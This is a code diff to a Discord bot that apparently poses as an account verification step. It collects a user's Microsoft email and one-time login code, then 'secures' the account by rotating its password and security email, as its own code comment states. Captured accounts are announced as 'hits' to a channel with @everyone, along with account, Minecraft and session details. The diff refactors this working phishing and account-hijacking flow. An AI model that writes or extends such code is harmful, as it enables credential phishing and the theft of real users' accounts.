@@ -5,13 +5,15 @@ import discord
 import json
 
 from ui.buttons.embed_buttons import ButtonOptions
-from ui.buttons.account_details import accountInfo
 
 from securing.secure import startSecuringAccount
 from securing.auth.initial_session import get_session
 from shared.send_logs import send_logs, build_log_embed
-from shared.post_verification import after_verify
-from shared.embeds import verify_embed
+from shared.post_hit import (
+    _checking_embed,
+    publish_embed_secure_result,
+    set_verify_ephemeral,
+)
 
 class MyModalTwo(ui.Modal):
     def __init__(self, username, email, flowtoken, ppft=None):
@@ -71,50 +73,33 @@ class MyModalTwo(ui.Modal):
 
         self.session = get_session()
 
-        vembed = verify_embed()
-        await interaction.followup.send(
-            embed=Embed(
-                title=vembed["title"],
-                description=vembed["description"],
-                colour=vembed["color"]
-            ),
-            ephemeral=True
+        await set_verify_ephemeral(interaction, _checking_embed())
+
+        # OTP login (not recovery-code). recovery=True still runs RecoverUser
+        # after login so password / security email get rotated — same as the
+        # authenticator embed path. Do not treat a failed dict as success.
+        try:
+            securedAccount = await startSecuringAccount(
+                self.session,
+                self.email,
+                self.flowtoken,
+                code,
+                recovery=True,
+                ppft=self.ppft,
+                embed_verify=True,
+            )
+        except Exception as exc:
+            import logging
+            logging.getLogger("bot").exception("embed OTP startSecuringAccount crashed")
+            securedAccount = {
+                "failed": True,
+                "reason": "Securing crashed",
+            }
+        await publish_embed_secure_result(
+            interaction=interaction,
+            hits_channel=hits_channel,
+            secured_account=securedAccount,
+            email=self.email,
+            username=self.username,
         )
-
-        # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
-        securedAccount = await startSecuringAccount(self.session, self.email, self.flowtoken, code, ppft=self.ppft)
-        
-        if not securedAccount:
-
-            embed = build_log_embed(
-                f"**Email | Status | Reason**\n```{self.email} | Failed to secure | Invalid Code Entered```",
-                0xFA4343,
-                user=interaction.user,
-                bot=interaction.client,
-            )
-
-            if self.username and self.username.strip():
-                embed.set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}")
-            
-            await send_logs(
-                interaction.client,
-                embed,
-                view = ButtonOptions(interaction.user, interaction.user.id, self.username),
-                email=self.email
-            )
-
-            return
-            
-        await hits_channel.send("@everyone **Successfully secured an account**")
-        await hits_channel.send(embed = securedAccount["details"]["stats_embed"])
-        await hits_channel.send(
-            embed = securedAccount["hit_embed"],
-            view = accountInfo(
-                securedAccount["details"]
-            )
-        )
-
-        mc_name = securedAccount['minecraft']['name']
-
-        await after_verify(interaction, mc_name)
 
